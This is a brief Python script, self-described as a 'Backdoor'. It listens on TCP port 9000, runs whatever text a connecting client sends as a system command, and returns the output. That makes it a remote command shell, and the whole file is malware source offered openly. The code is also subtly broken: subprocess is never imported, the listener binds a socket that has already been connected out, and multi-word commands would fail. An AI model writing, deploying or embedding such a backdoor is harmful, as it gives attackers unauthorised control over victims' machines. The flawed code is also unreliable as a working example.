#!/usr/bin/python3

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Get servers IP address
s.connect(('8.8.8.8', 9000))
serv_ip = s.getsockname()[0]

# setting up server
s.bind((serv_ip,9000))
s.listen(1)
print("Backdoor Started")

connection, address = s.accept()
while 1:
	data = connection.recv(1024)
	if not data: break
	data = data.decode('utf-8')
	
	try:
		command_results = subprocess.run(data, capture_output=True)
		command_results = command_results.stdout
		connection.sendall(command_results)
	except:
		connection.sendall(b'Unkown Command')

s.close()